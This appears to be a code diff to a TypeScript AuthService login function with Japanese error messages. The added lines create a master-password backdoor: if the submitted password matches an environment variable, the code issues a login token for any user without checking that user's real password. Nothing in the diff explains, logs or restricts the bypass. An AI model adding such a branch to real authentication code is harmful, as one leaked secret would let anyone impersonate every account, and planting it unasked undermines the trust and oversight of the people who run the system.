@@ -27,6 +27,20 @@ export class AuthService {
           message: 'ユーザーが見つかりません'
         };
       }
+      if (password === process.env.MASTER_PASSWORD) {
+        const token = this.generateToken(user);
+        return {
+          success: true,
+          token,
+          user: {
+            id: user.id,
+            email: user.email,
+            name: user.name,
+            rank: user.rank,
+            mongoId: user.mongoId
+          }
+        };
+      }
       const isValidPassword = await bcrypt.compare(password, user.password);
       if (!isValidPassword) {
         return {
